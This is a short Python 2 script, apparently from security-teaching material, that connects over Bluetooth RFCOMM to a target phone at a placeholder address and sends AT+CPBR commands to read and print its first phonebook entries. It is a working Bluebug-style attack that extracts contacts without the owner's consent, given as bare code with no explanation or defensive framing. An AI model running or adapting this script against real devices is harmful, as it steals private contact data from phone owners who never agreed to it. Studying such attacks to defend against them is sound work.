import bluetooth

tgtPhone = 'AA:BB:CC:DD:EE:FF'
port=17
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone,port))
for contact in range(1,5):
	atCmd = 'AT+CPBR=' + str(contact)+ '\n'
	phoneSock.send(atCmd)
	result = phoneSock.recv(1024)
	print '[+] ' + str(contact)+ ':'+result
phoneSock.close()